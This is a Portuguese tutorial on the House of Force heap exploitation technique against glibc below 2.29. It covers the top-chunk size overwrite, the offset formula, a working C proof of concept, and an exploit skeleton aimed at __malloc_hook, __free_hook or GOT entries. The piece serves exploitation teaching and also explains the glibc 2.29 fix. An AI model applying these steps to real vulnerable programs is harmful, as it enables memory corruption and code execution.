The House of Force

House of Force faz o malloc devolver um endereço arbitrário corrompendo o campo size do top chunk. Funciona em glibc < 2.29.

O top chunk é o espaço livre no fim da heap. Quando nenhum bin atende um pedido, o malloc corta o começo do top chunk e avança o ponteiro top:

// _int_malloc, simplificado
victim = av->top;
size = chunksize (victim);
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) {
    remainder = chunk_at_offset (victim, nb);    // novo top = top antigo + nb
    av->top = remainder;
    set_head (remainder, (size - nb) | PREV_INUSE);
    return chunk2mem (victim);
}

A única barreira é a comparação size >= nb + MINSIZE, sem sinal. Se o size do top chunk for 0xffffffffffffffff, qualquer pedido passa, e o novo top é simplesmente top + nb. Escolhendo nb, colocamos o top onde quisermos, e a alocação seguinte sai de lá.

Pré-requisitos​

  1. Sobrescrever o size do top chunk: um heap overflow no último chunk alocado basta (o top vem logo depois).
  2. Controlar o tamanho de um malloc, sem limite superior: o pedido é enorme (ou "negativo").
  3. Saber a distância entre o top chunk e o alvo: leak da heap, mais o endereço do alvo (leak de libc, ou binário sem PIE para alvos na .bss/GOT).
  4. glibc < 2.29.

O ataque​

  1. Corromper: sobrescreva o size do top chunk com 0xffffffffffffffff.
  2. Mover o top: peça malloc(alvo - top - 0x20), onde top é o endereço do header do top chunk.
  3. Alocar no alvo: o malloc seguinte devolve exatamente alvo. O que o programa escrever nesse chunk é escrito no alvo.

De onde vem o 0x20? Queremos o novo header do top em alvo - 0x10, para que o chunk seguinte tenha os dados em alvo. O malloc(n) consome n + 0x10 bytes do top (o pedido mais o header, a menos de arredondamento). Então top + n + 0x10 = alvo - 0x10, e n = alvo - top - 0x20.

Para o arredondamento não atrapalhar, alvo deve ser múltiplo de 16 (se não for, mire alvo & ~0xf e compense com padding na escrita).

Alvo antes da heap​

O alvo pode estar em endereços menores que o top chunk (GOT e .bss do binário ficam antes da heap). A conta alvo - top - 0x20 dá negativa, e, como tudo é aritmética sem sinal de 64 bits, vira um número enorme que faz top + nb dar a volta no espaço de endereços e cair no lugar certo.

n = (alvo - top - 0x20) & 0xffffffffffffffff

O programa precisa aceitar esse tamanho. Um atoi que guarda o valor em int de 32 bits, ou uma checagem size < 0x1000, inviabiliza o ataque. Um size lido como long/size_t e sem limite é o cenário certo.

Exemplo​

// Requer glibc < 2.29 (ex: Ubuntu 18.04, glibc 2.27)
#include <stdio.h>
#include <stdlib.h>

long target_var = 0;                        // alvo: variável global, antes da heap

int main() {
    long *a = malloc(0x18);                 // chunk de 0x20; o top chunk vem logo depois

    // "Overflow": os dados de a vão de a até a+0x18, e a+0x18 é o size do top chunk
    a[3] = -1;                              // top->size = 0xffffffffffffffff

    unsigned long top  = (unsigned long)a + 0x10;      // header do top chunk
    unsigned long alvo = (unsigned long)&target_var;

    malloc(alvo - top - 0x20);              // move o top para alvo - 0x10
    long *evil = malloc(0x10);              // devolve alvo

    printf("alvo: %p, evil: %p\n", (void *)alvo, (void *)evil);
    *evil = 0x4141414141414141;
    printf("target_var = %#lx\n", target_var);
}

Em um exploit real, o roteiro é o mesmo:

edit(0, b'A' * 0x18 + p64(0xffffffffffffffff))            # overflow até o size do top
alloc((alvo - top - 0x20) & 0xffffffffffffffff, b'')      # move o top
alloc(0x18, p64(valor))                                   # escreve no alvo

Alvos usuais (glibc < 2.29, então os hooks existem): __malloc_hook ou __free_hook com system ou um one_gadget, uma entrada da GOT (sem Full RELRO), ou um ponteiro de função do programa.

Mitigações​

Top Chunk Integrity Check​

A glibc 2.29 passou a validar o size do top chunk antes de usá-lo:

if (__glibc_unlikely (size > av->system_mem))
  malloc_printerr ("malloc(): corrupted top size");

system_mem é o total de memória que a arena obteve do kernel (0x21000 em uma heap recém-criada). Um size de -1 é rejeitado na hora. Ainda dá para mentir um valor até system_mem, mas aí o salto máximo é do tamanho da própria heap, o que não alcança libc, stack nem (para trás) o binário.

Na prática, o House of Force acabou na glibc 2.29. Para "alocar em endereço arbitrário" em versões mais novas, o caminho é Tcache Poisoning. Corromper o size do top chunk para um valor menor continua útil em outra técnica: House of Orange (e House of Tangerine), em que o top antigo é liberado quando a heap é estendida.

Resumo​

  1. top->size = 0xffffffffffffffff
  2. malloc(alvo - top - 0x20)
  3. malloc(n) devolve alvo
